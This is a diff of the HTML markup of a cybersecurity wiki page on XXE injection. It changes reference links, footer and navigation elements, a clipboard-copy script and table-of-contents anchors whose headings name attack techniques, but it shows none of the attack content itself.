-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references"><strong>References:</strong><a class="anchor" href="#references">#</a></h2>
 <p><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/xxe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noreferrer noopener nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
@@ -1993,49 +1776,62 @@ External entities enabled by default.</p>
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/XXE%20%28XML%20External%20Entities%29.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/XPath-Injection/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>XPath Injection</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/machine-learning/learning/" class="flex align-center">
+        <span>Learning Process</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -2072,7 +1868,7 @@ External entities enabled by default.</p>
             <li><a href="#3-xxe-via-xinclude-bypass-dtd-blocks"><strong>3. XXE via XInclude (Bypass DTD Blocks)</strong></a></li>
             <li><a href="#4-xxe-in-soap-requests"><strong>4. XXE in SOAP Requests</strong></a></li>
             <li><a href="#5-xxe-for-rce-rare-but-possible"><strong>5. XXE for RCE (Rare but Possible)</strong></a></li>
-            <li><a href="#phpexpectwrapper"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
+            <li><a href="#php"><strong>PHP <code>expect://</code> Wrapper</strong></a></li>
             <li><a href="#6-billion-laugh-attack">6. <strong>Billion Laugh Attack</strong></a></li>
             <li><a href="#xslt-based-rce"><strong>XSLT-Based RCE</strong></a></li>
             <li><a href="#7-bypassing-wafs--filters"><strong>7. Bypassing WAFs &amp; Filters</strong></a></li>
@@ -2089,7 +1885,7 @@ External entities enabled by default.</p>
         <li><a href="#framework-specific-scenarios">Framework-Specific Scenarios</a>
           <ul>
             <li><a href="#java">Java</a></li>
-            <li><a href="#php">PHP</a></li>
+            <li><a href="#php-1">PHP</a></li>
             <li><a href="#net">.NET</a></li>
             <li><a href="#python">Python</a></li>
             <li><a href="#nodejs">Node.js</a></li>
@@ -2128,15 +1924,24 @@ External entities enabled by default.</p>
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
